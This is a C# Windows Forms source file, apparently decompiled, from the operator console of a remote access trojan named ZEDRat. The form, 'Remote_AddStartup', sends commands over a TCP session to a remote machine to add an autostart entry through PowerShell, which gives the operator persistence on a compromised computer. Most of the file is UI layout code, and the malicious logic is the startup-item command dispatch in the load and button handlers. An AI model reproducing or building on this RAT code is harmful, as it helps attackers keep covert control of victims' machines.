using System;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using Siticone.Desktop.UI.WinForms;

using Sockets;
using ZEDRAT.TCP;
using ZEDRatApp.ZEDRAT.Module;

namespace ZEDRatApp.Forms
{
	public class Remote_AddStartup : Form
	{
		public TcpClientSession _tcs;

		public Remote_Startup_Manager _rsm;

		public object ObjStatus = new object();

		public bool Statusing;

		private IContainer components;

		private Label lblPath;

		private Label lblName;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private SiticoneControlBox siticoneControlBox1;

		private SiticoneRoundedButton btnAdd;

		private SiticoneRoundedButton btnCancel;

		private SiticoneTextBox txtName;

		private SiticoneTextBox txtPath;

		private SiticoneGroupBox siticoneGroupBox1;

		private BunifuSeparator bunifuSeparator2;

		private SiticoneHtmlLabel SiticoneHtmlLabel12;

		private BunifuIconButton CloseBtn;

		private Guna2ShadowForm guna2ShadowForm1;

		public Remote_AddStartup(string strFormTxt, TcpClientSession tcs)
		{
			this.InitializeComponent();
			this.Text = strFormTxt;
			this._tcs = tcs;
			this._rsm = new Remote_Startup_Manager(this._tcs);
		}

		private void Remote_AddStartup_Load(object sender, EventArgs e)
		{
			this._tcs._Idispatchar.Register(DataType.RemoteStartupType, new Action<TcpClientSession, byte[]>(this._rsm.RemoteStartupExecute));
			this._rsm._FormExecute = new Action<string, object>(UpdateRemoteStartup_Form);
			this._rsm.Remote_Startup_Send("DoStartupItemAdd_Powershell_Path", Encoding.UTF8.GetBytes(""));
			base.FormClosed += new FormClosedEventHandler(Remote_Startup_FormClosed);
		}

		public void UpdateRemoteStartup_Form(string DateType, object ob)
		{
			try
			{
				lock (this.ObjStatus)
				{
					this.Statusing = false;
				}
				if (DateType == "result")
				{
					base.Invoke((MethodInvoker)delegate
					{
						if (((string)ob).Contains("True"))
						{
							MessageBox.Show("好，您已成功添加啟動項。");
						}
						else
						{
							MessageBox.Show("抱歉，您無法添加啟動項。");
						}
					});
				}
				else if (DateType == "ProcessPath")
				{
					base.Invoke((MethodInvoker)delegate
					{
						(this.txtPath).Text = (string)ob;
					});
				}
			}
			catch (Exception)
			{
			}
		}

		private void Remote_Startup_FormClosed(object sender, FormClosedEventArgs e)
		{
			this._tcs?._Idispatchar?.Unregister(DataType.RemoteStartupType);
			this._rsm?.destroy();
			this._tcs = null;
			this._rsm = null;
			GC.Collect();
		}

		private void btnAdd_Click(object sender, EventArgs e)
		{
			AutoStartItem.Name = (this.txtName).Text;
			AutoStartItem.Path = (this.txtPath).Text;
			this._rsm.Remote_Startup_Send("DoStartupItemAdd_Powershell", Encoding.UTF8.GetBytes(AutoStartItem.Name + "," + AutoStartItem.Path));
		}

		private void btnCancel_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
																																													this.components = new System.ComponentModel.Container();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ZEDRatApp.Forms.Remote_AddStartup));
			this.lblPath = new System.Windows.Forms.Label();
			this.lblName = new System.Windows.Forms.Label();
			this.guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.siticoneControlBox1 = new SiticoneControlBox();
			this.btnCancel = new SiticoneRoundedButton();
			this.btnAdd = new SiticoneRoundedButton();
			this.txtPath = new SiticoneTextBox();
			this.txtName = new SiticoneTextBox();
			this.siticoneGroupBox1 = new SiticoneGroupBox();
			this.bunifuSeparator2 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.SiticoneHtmlLabel12 = new SiticoneHtmlLabel();
			this.CloseBtn = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			((System.Windows.Forms.Control)(object)this.siticoneGroupBox1).SuspendLayout();
			base.SuspendLayout();
			this.lblPath.AutoSize = true;
			this.lblPath.BackColor = System.Drawing.Color.Transparent;
			this.lblPath.Location = new System.Drawing.Point(23, 106);
			this.lblPath.Name = "lblPath";
			this.lblPath.Size = new System.Drawing.Size(38, 17);
			this.lblPath.TabIndex = 6;
			this.lblPath.Text = "Path:";
			this.lblName.AutoSize = true;
			this.lblName.BackColor = System.Drawing.Color.Transparent;
			this.lblName.Location = new System.Drawing.Point(23, 68);
			this.lblName.Name = "lblName";
			this.lblName.Size = new System.Drawing.Size(47, 17);
			this.lblName.TabIndex = 5;
			this.lblName.Text = "Name:";
			this.guna2BorderlessForm1.ContainerControl = this;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.siticoneControlBox1.BorderColor = System.Drawing.Color.DarkGray;
			this.siticoneControlBox1.BorderRadius = 12;
			this.siticoneControlBox1.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.siticoneControlBox1.IconColor = System.Drawing.Color.Black;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Location = new System.Drawing.Point(615, 12);
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Name = "siticoneControlBox1";
			this.siticoneControlBox1.PressedColor = System.Drawing.Color.Red;
			this.siticoneControlBox1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.siticoneControlBox1;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Size = new System.Drawing.Size(45, 29);
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).TabIndex = 20;
			(this.btnCancel).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnCancel).BorderThickness = 1;
			(this.btnCancel).CheckedState.Parent = this.btnCancel;
			(this.btnCancel).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnCancel).CustomBorderThickness = new System.Windows.Forms.Padding(1, 0, 0, 0);
			(this.btnCancel).CustomImages.Parent = this.btnCancel;
			(this.btnCancel).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.btnCancel).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnCancel).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.btnCancel).Location = new System.Drawing.Point(12, 231);
			((System.Windows.Forms.Control)(object)this.btnCancel).Name = "btnCancel";
			(this.btnCancel).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnCancel;
			((System.Windows.Forms.Control)(object)this.btnCancel).Size = new System.Drawing.Size(119, 25);
			((System.Windows.Forms.Control)(object)this.btnCancel).TabIndex = 42;
			((System.Windows.Forms.Control)(object)this.btnCancel).Text = "Cancel";
			((System.Windows.Forms.Control)(object)this.btnCancel).Click += new System.EventHandler(btnCancel_Click);
			(this.btnAdd).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnAdd).BorderThickness = 1;
			(this.btnAdd).CheckedState.Parent = this.btnAdd;
			(this.btnAdd).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnAdd).CustomBorderThickness = new System.Windows.Forms.Padding(1, 0, 0, 0);
			(this.btnAdd).CustomImages.Parent = this.btnAdd;
			(this.btnAdd).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.btnAdd).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnAdd).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.btnAdd).Location = new System.Drawing.Point(541, 231);
			((System.Windows.Forms.Control)(object)this.btnAdd).Name = "btnAdd";
			(this.btnAdd).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnAdd;
			((System.Windows.Forms.Control)(object)this.btnAdd).Size = new System.Drawing.Size(119, 25);
			((System.Windows.Forms.Control)(object)this.btnAdd).TabIndex = 43;
			((System.Windows.Forms.Control)(object)this.btnAdd).Text = "Add";
			((System.Windows.Forms.Control)(object)this.btnAdd).Click += new System.EventHandler(btnAdd_Click);
			((System.Windows.Forms.Control)(object)this.txtPath).BackColor = System.Drawing.Color.Transparent;
			(this.txtPath).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.txtPath).Cursor = System.Windows.Forms.Cursors.IBeam;
			(this.txtPath).DefaultText = "";
			(this.txtPath).DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			(this.txtPath).DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			(this.txtPath).DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtPath).DisabledState.Parent = this.txtPath;
			(this.txtPath).DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtPath).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			(this.txtPath).FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.txtPath).FocusedState.Parent = this.txtPath;
			((System.Windows.Forms.Control)(object)this.txtPath).Location = new System.Drawing.Point(86, 98);
			((System.Windows.Forms.Control)(object)this.txtPath).Name = "txtPath";
			(this.txtPath).PasswordChar = '\0';
			(this.txtPath).PlaceholderText = "";
			(this.txtPath).SelectedText = "";
			(this.txtPath).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.txtPath;
			((System.Windows.Forms.Control)(object)this.txtPath).Size = new System.Drawing.Size(535, 32);
			((System.Windows.Forms.Control)(object)this.txtPath).TabIndex = 44;
			((System.Windows.Forms.Control)(object)this.txtName).BackColor = System.Drawing.Color.Transparent;
			(this.txtName).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.txtName).Cursor = System.Windows.Forms.Cursors.IBeam;
			(this.txtName).DefaultText = "";
			(this.txtName).DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			(this.txtName).DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			(this.txtName).DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtName).DisabledState.Parent = this.txtName;
			(this.txtName).DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtName).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			(this.txtName).FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.txtName).FocusedState.Parent = this.txtName;
			((System.Windows.Forms.Control)(object)this.txtName).Location = new System.Drawing.Point(86, 60);
			((System.Windows.Forms.Control)(object)this.txtName).Name = "txtName";
			(this.txtName).PasswordChar = '\0';
			(this.txtName).PlaceholderText = "";
			(this.txtName).SelectedText = "";
			(this.txtName).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.txtName;
			((System.Windows.Forms.Control)(object)this.txtName).Size = new System.Drawing.Size(535, 32);
			((System.Windows.Forms.Control)(object)this.txtName).TabIndex = 45;
			this.siticoneGroupBox1.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.siticoneGroupBox1).Controls.Add(this.lblName);
			((System.Windows.Forms.Control)(object)this.siticoneGroupBox1).Controls.Add((System.Windows.Forms.Control)(object)this.txtPath);
			((System.Windows.Forms.Control)(object)this.siticoneGroupBox1).Controls.Add(this.lblPath);
			((System.Windows.Forms.Control)(object)this.siticoneGroupBox1).Controls.Add((System.Windows.Forms.Control)(object)this.txtName);
			this.siticoneGroupBox1.CustomBorderColor = System.Drawing.Color.FromArgb(18, 15, 24);
			this.siticoneGroupBox1.FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.siticoneGroupBox1).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.siticoneGroupBox1).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.siticoneGroupBox1).Location = new System.Drawing.Point(12, 63);
			((System.Windows.Forms.Control)(object)this.siticoneGroupBox1).Name = "siticoneGroupBox1";
			this.siticoneGroupBox1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.siticoneGroupBox1;
			((System.Windows.Forms.Control)(object)this.siticoneGroupBox1).Size = new System.Drawing.Size(648, 148);
			((System.Windows.Forms.Control)(object)this.siticoneGroupBox1).TabIndex = 46;
			((System.Windows.Forms.Control)(object)this.siticoneGroupBox1).Text = "StartUp";
			this.bunifuSeparator2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator2.BackgroundImage");
			this.bunifuSeparator2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator2.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator2.LineColor = System.Drawing.Color.DimGray;
			this.bunifuSeparator2.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator2.LineThickness = 1;
			this.bunifuSeparator2.Location = new System.Drawing.Point(-3, 57);
			this.bunifuSeparator2.Margin = new System.Windows.Forms.Padding(6, 2, 6, 2);
			this.bunifuSeparator2.Name = "bunifuSeparator2";
			this.bunifuSeparator2.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator2.Size = new System.Drawing.Size(674, 9);
			this.bunifuSeparator2.TabIndex = 91;
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).BackColor = System.Drawing.Color.Transparent;
			this.SiticoneHtmlLabel12.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.SiticoneHtmlLabel12.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).Location = new System.Drawing.Point(256, 21);
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).Name = "SiticoneHtmlLabel12";
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).Size = new System.Drawing.Size(140, 23);
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).TabIndex = 92;
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).Text = "StartUp Manager";
			this.CloseBtn.AllowAnimations = true;
			this.CloseBtn.AllowBorderColorChanges = true;
			this.CloseBtn.AllowMouseEffects = true;
			this.CloseBtn.Anchor = System.Windows.Forms.AnchorStyles.None;
			this.CloseBtn.AnimationSpeed = 200;
			this.CloseBtn.BackColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BackgroundColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.CloseBtn.BorderRadius = 1;
			this.CloseBtn.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.CloseBtn.BorderThickness = 1;
			this.CloseBtn.ColorContrastOnClick = 30;
			this.CloseBtn.ColorContrastOnHover = 30;
			this.CloseBtn.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.CloseBtn.CustomizableEdges = borderEdges;
			this.CloseBtn.DialogResult = System.Windows.Forms.DialogResult.None;
			this.CloseBtn.Image = (System.Drawing.Image)resources.GetObject("CloseBtn.Image");
			this.CloseBtn.ImageMargin = new System.Windows.Forms.Padding(0);
			this.CloseBtn.Location = new System.Drawing.Point(12, 12);
			this.CloseBtn.Name = "CloseBtn";
			this.CloseBtn.RoundBorders = false;
			this.CloseBtn.ShowBorders = true;
			this.CloseBtn.Size = new System.Drawing.Size(35, 35);
			this.CloseBtn.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.CloseBtn.TabIndex = 169;
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(672, 268);
			base.Controls.Add(this.CloseBtn);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneGroupBox1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12);
			base.Controls.Add(this.bunifuSeparator2);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnAdd);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnCancel);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneControlBox1);
			this.ForeColor = System.Drawing.Color.WhiteSmoke;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.MaximizeBox = false;
			base.Name = "Remote_AddStartup";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Add to autostart";
			base.Load += new System.EventHandler(Remote_AddStartup_Load);
			((System.Windows.Forms.Control)(object)this.siticoneGroupBox1).ResumeLayout(false);
			((System.Windows.Forms.Control)(object)this.siticoneGroupBox1).PerformLayout();
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
